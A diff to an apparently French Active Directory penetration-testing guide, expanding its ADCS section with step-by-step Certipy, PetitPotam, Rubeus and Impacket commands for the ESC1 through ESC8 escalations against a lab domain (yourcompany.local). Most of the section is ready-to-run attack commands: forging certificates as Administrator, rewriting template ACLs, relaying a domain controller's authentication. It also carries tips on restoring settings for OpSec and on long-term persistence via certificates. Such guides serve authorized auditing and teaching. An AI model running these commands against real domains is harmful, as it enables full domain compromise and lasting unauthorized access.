@@ -545,32 +545,220 @@ secretsdump.py yourcompany.local/admin:'Password123'@dc01.yourcompany.local -jus
 
 ### 6.2 ADCS Exploitation (ESC1-ESC8)
 
-Active Directory Certificate Services peut être abusé pour l'escalade de privilèges.
+Active Directory Certificate Services (ADCS) est souvent mal configuré et constitue un vecteur d'escalade de privilèges majeur. Les vulnérabilités ESC (Escalation) permettent d'obtenir des certificats pour n'importe quel utilisateur, y compris Domain Admin.
 
-**ESC1 - Template avec enrollee supplies subject :**
+!!! info "Outil principal : Certipy"
+    [Certipy](https://github.com/ly4k/Certipy) est l'outil de référence pour l'audit et l'exploitation ADCS.
+
+    ```bash
+    # Installation
+    pip install certipy-ad
+    ```
+
+#### Énumération ADCS
 
 ```bash
-# Identifier les templates vulnérables
+# Énumération complète de l'infrastructure PKI
 certipy find -u j.smith@yourcompany.local -p 'Welcome1' -dc-ip 192.168.56.10
 
-# Demander un certificat pour Administrator
-certipy req -u j.smith@yourcompany.local -p 'Welcome1' -ca 'CA-NAME' -target dc01.yourcompany.local -template 'VulnerableTemplate' -upn Administrator@yourcompany.local
+# Résultat : fichier JSON + texte avec toutes les vulnérabilités identifiées
+# Chercher : [!] Vulnerabilities
 
-# Authentification avec le certificat
-certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+# Énumération avec BloodHound output
+certipy find -u j.smith@yourcompany.local -p 'Welcome1' -dc-ip 192.168.56.10 -bloodhound
 ```
 
-**ESC4 - Template ACL abuse :**
+#### ESC1 - Enrollee Supplies Subject
+
+**Vulnérabilité :** Le template permet à l'utilisateur de spécifier le Subject Alternative Name (SAN), permettant de demander un certificat pour n'importe quel utilisateur.
+
+**Conditions :**
+
+- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé
+- Client Authentication ou Smart Card Logon EKU
+- Droits d'enrollment pour des utilisateurs non-privilégiés
 
 ```bash
-# Si on a WriteDacl sur un template
-certipy template -u j.smith@yourcompany.local -p 'Welcome1' -template 'VulnerableTemplate' -save-old
+# Identifier les templates ESC1
+certipy find -u j.smith@yourcompany.local -p 'Welcome1' -dc-ip 192.168.56.10 -vulnerable -stdout | grep -A 20 "ESC1"
 
-# Modifier pour activer ESC1
-certipy template -u j.smith@yourcompany.local -p 'Welcome1' -template 'VulnerableTemplate' -configuration 'ESC1'
+# Demander un certificat pour Administrator
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'VulnerableTemplate' \
+    -upn Administrator@yourcompany.local
+
+# Résultat : administrator.pfx
+
+# S'authentifier avec le certificat
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+
+# Résultat : hash NTLM de Administrator
+# Puis Pass-the-Hash
+```
+
+#### ESC2 - Any Purpose EKU
+
+**Vulnérabilité :** Le template a l'EKU "Any Purpose" ou pas d'EKU, permettant l'utilisation du certificat pour l'authentification.
+
+```bash
+# Exploitation similaire à ESC1 si ENROLLEE_SUPPLIES_SUBJECT est aussi activé
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'AnyPurposeTemplate' \
+    -upn Administrator@yourcompany.local
+```
+
+#### ESC3 - Enrollment Agent
+
+**Vulnérabilité :** Un template permet d'obtenir un certificat "Enrollment Agent" qui peut ensuite demander des certificats au nom d'autres utilisateurs.
+
+```bash
+# Étape 1 : Obtenir un certificat Enrollment Agent
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'EnrollmentAgent'
+
+# Étape 2 : Utiliser ce certificat pour demander un cert au nom d'Administrator
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'User' \
+    -on-behalf-of 'yourcompany\Administrator' \
+    -pfx enrollmentagent.pfx
+```
+
+#### ESC4 - Template ACL Abuse
+
+**Vulnérabilité :** Un utilisateur a des droits d'écriture (WriteDacl, WriteOwner, WriteProperty) sur un template de certificat.
+
+```bash
+# Sauvegarder la configuration originale
+certipy template -u j.smith@yourcompany.local -p 'Welcome1' \
+    -template 'VulnerableTemplate' -save-old
+
+# Modifier le template pour activer ESC1
+certipy template -u j.smith@yourcompany.local -p 'Welcome1' \
+    -template 'VulnerableTemplate' \
+    -configuration ESC1
 
 # Exploiter comme ESC1
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'VulnerableTemplate' \
+    -upn Administrator@yourcompany.local
+
+# Restaurer (optionnel, pour OpSec)
+certipy template -u j.smith@yourcompany.local -p 'Welcome1' \
+    -template 'VulnerableTemplate' -configuration 'VulnerableTemplate.json'
 ```
+
+#### ESC5 - PKI Object ACL Abuse
+
+**Vulnérabilité :** Droits d'écriture sur des objets PKI critiques (CA, NTAuthCertificates).
+
+```bash
+# Similaire à ESC4 mais sur les objets CA
+# Permet de modifier les configurations de la CA elle-même
+```
+
+#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+
+**Vulnérabilité :** Le flag `EDITF_ATTRIBUTESUBJECTALTNAME2` est activé sur la CA, permettant de spécifier un SAN dans n'importe quelle requête.
+
+```bash
+# Vérifier si le flag est activé (dans le rapport certipy find)
+# "User Specified SAN" : "Enabled"
+
+# Exploitation : demander n'importe quel template avec SAN
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'User' \
+    -upn Administrator@yourcompany.local
+```
+
+#### ESC7 - CA ACL Abuse
+
+**Vulnérabilité :** Droits ManageCA ou ManageCertificates sur la CA permettant d'approuver des requêtes en attente ou de modifier la configuration.
+
+```bash
+# Si ManageCA : activer le flag ESC6
+certipy ca -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -enable-template 'SubCA'
+
+# Puis demander un certificat SubCA
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -template 'SubCA' \
+    -upn Administrator@yourcompany.local
+
+# La requête sera "pending" - l'approuver avec ManageCertificates
+certipy ca -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -issue-request [REQUEST_ID]
+
+# Récupérer le certificat
+certipy req -u j.smith@yourcompany.local -p 'Welcome1' \
+    -ca 'YOURCOMPANY-CA' \
+    -target dc01.yourcompany.local \
+    -retrieve [REQUEST_ID]
+```
+
+#### ESC8 - NTLM Relay to HTTP Enrollment
+
+**Vulnérabilité :** L'interface web d'enrollment (certsrv) accepte NTLM et n'a pas de protection contre le relay.
+
+```bash
+# Lancer le relay vers le web enrollment
+certipy relay -target 'http://ca.yourcompany.local/certsrv/certfnsh.asp' -ca 'YOURCOMPANY-CA' -template 'DomainController'
+
+# Dans un autre terminal, forcer l'authentification d'un DC (PetitPotam, PrinterBug)
+python3 PetitPotam.py 192.168.56.100 dc01.yourcompany.local
+
+# Le certificat du DC est obtenu automatiquement
+# S'authentifier
+certipy auth -pfx dc01.pfx -dc-ip 192.168.56.10
+```
+
+#### Tableau Récapitulatif ESC
+
+| ESC | Condition | Impact | Difficulté |
+|-----|-----------|--------|:----------:|
+| ESC1 | ENROLLEE_SUPPLIES_SUBJECT + Auth EKU | Domain Admin | Facile |
+| ESC2 | Any Purpose / No EKU | Varie | Facile |
+| ESC3 | Enrollment Agent template | Domain Admin | Moyen |
+| ESC4 | Write access sur template | Domain Admin | Moyen |
+| ESC5 | Write access sur CA objects | Domain Admin | Moyen |
+| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | Domain Admin | Facile |
+| ESC7 | ManageCA / ManageCertificates | Domain Admin | Moyen |
+| ESC8 | HTTP enrollment + NTLM relay | Domain Admin | Moyen |
+
+#### Authentification avec Certificat
+
+Une fois le certificat obtenu (.pfx), plusieurs options :
+
+```bash
+# Option 1 : Certipy (récupère le hash NTLM)
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+# Résultat : Administrator:HASH
+
+# Option 2 : Rubeus (injection TGT)
+.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt
+
+# Option 3 : PKINIT avec Impacket
+gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip 192.168.56.10 yourcompany.local/Administrator administrator.ccache
+export KRB5CCNAME=administrator.ccache
+```
+
+!!! warning "Persistance via ADCS"
+    Un certificat utilisateur est valide **1-2 ans** par défaut. Même si le mot de passe change, le certificat reste valide = persistence long terme.
 
 ### 6.3 GPO Abuse
 
